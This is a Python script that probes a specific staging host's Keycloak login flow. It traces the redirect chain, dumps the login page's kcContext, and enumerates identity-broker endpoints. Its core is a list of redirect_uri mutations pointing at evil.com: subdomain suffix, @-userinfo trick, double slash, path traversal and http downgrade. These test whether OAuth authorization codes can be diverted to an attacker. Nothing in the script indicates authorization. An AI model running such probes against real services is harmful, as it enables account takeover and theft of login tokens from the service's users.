# -*- coding: utf-8 -*-
"""1) console 302 链完整 Location(官方 auth URL 全参)
2) 官方 URL 200 页 kcContext 全量(剥注释)
3) redirect_uri 变异矩阵(其余参数保持官方)
4) broker login 端点行为(github/google/hasura/microsoft)"""
import http.client, ssl, json, time, urllib.parse, re

ctx = ssl.create_default_context()
HOST = 'console-stage.neon.build'
REALM = 'staging-realm'

def req(path, method='GET', body=None, headers=None, host=HOST):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        if body is not None:
            h['Content-Type'] = 'application/x-www-form-urlencoded'
        if headers:
            h.update(headers)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

def parse_kc(raw):
    """剥 Java 注释后解析 kcContext"""
    m = re.search(r'const kcContext = (\{.*?\});', raw, re.S)
    if not m:
        return None
    s = re.sub(r'/\*.*?\*/', '', m.group(1), flags=re.S)
    try:
        return json.loads(s)
    except Exception:
        return None

print('=== [1] 完整 302 链 ===', flush=True)
path = '/'
for hop in range(4):
    st, raw, hdrs = req(path)
    loc = hdrs.get('location', '')
    print('hop%d [%s] -> %d' % (hop, path[:60], st), flush=True)
    if loc:
        print('  LOC: %s' % loc, flush=True)
    if st in (301, 302, 303, 307, 308) and loc:
        u = urllib.parse.urlparse(loc)
        path = u.path + ('?' + u.query if u.query else '')
        if u.hostname and u.hostname != HOST:
            break
    else:
        break
    time.sleep(0.3)

# 解析官方参数
m = re.search(r'client_id=([^&]+)&redirect_uri=([^&]+)', path)
official_ru = ''
if m:
    official_ru = urllib.parse.unquote(m.group(2))
    print('\nofficial redirect_uri: %s' % official_ru, flush=True)
    print('official full path: %s' % path, flush=True)

print('\n=== [2] 官方 URL 页面 kcContext ===', flush=True)
st, raw, hdrs = req(path)
print('status:', st, 'CT:', hdrs.get('content-type', ''), flush=True)
d = parse_kc(raw)
if d:
    print('pageId:', d.get('pageId'))
    print('msg:', d.get('message'))
    if d.get('social'):
        for p in d['social'].get('providers', []):
            print('  provider:', p.get('displayName'), '|', p.get('alias'), '|', p.get('loginUrl'))
    print('realm name:', (d.get('realm') or {}).get('name'))
    for k, v in d.items():
        if not isinstance(v, (dict, list)):
            print('  %s = %s' % (k, str(v)[:120]))
    auth = d.get('auth') or {}
    print('  auth keys:', list(auth.keys())[:30])
else:
    print('parse fail; raw head:', raw[:300].replace('\n', ' '))

print('\n=== [3] redirect_uri 变异(官方参数基线) ===', flush=True)
if official_ru:
    base_q = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
    def build(ru):
        q = dict(base_q)
        q['redirect_uri'] = [ru]
        q['state'] = [ru + ':st']
        return '/realms/%s/protocol/openid-connect/auth?%s' % (REALM, urllib.parse.urlencode(q, doseq=True))
    cands = [
        official_ru,  # 基线(应 200/302)
        official_ru.replace('https://', 'http://'),
        official_ru + '/',
        official_ru.replace('console-stage.neon.build', 'console-stage.neon.build.evil.com'),
        official_ru.replace('console-stage.neon.build', 'evil.com'),
        official_ru.replace('console-stage.neon.build', 'console-stage.neon.build@evil.com'),
        official_ru.replace('/auth/keycloak/', '/auth/keycloak/%2f..%2f..%2f'),
        official_ru.replace('https://console-stage.neon.build/', 'https://console-stage.neon.build//evil.com/'),
        'https://evil.com/' + official_ru.split('.build/', 1)[1],
    ]
    seen = set()
    for ru in cands:
        if ru in seen:
            continue
        seen.add(ru)
        p = build(ru)
        st2, raw2, hdrs2 = req(p)
        loc = hdrs2.get('location', '')
        d2 = parse_kc(raw2)
        info = ''
        if d2:
            info = 'page=%s msg=%s' % (d2.get('pageId'), str(d2.get('message'))[:80])
            if d2.get('auth') and d2['auth'].get('error'):
                info += ' auth.err=' + str(d2['auth'].get('error'))[:60]
        elif st2 == 302:
            info = 'REDIRECT'
        print('[%s] %s -> %d %s %s' % ('OK' if st2 in (200, 302) else '--', ru[:70], st2, info, loc[:110]), flush=True)
        time.sleep(0.4)

print('\n=== [4] broker login 端点 ===', flush=True)
for alias in ['github', 'google', 'hasura', 'microsoft', 'oidc']:
    for tail in ['/login', '/endpoint', '/token']:
        p = '/realms/%s/broker/%s%s' % (REALM, alias, tail)
        st3, raw3, hdrs3 = req(p)
        loc = hdrs3.get('location', '')
        ct = hdrs3.get('content-type', '')
        print('[%s%s] -> %d CT=%s loc=%s' % (alias, tail, st3, ct[:25], loc[:130]), flush=True)
        time.sleep(0.3)
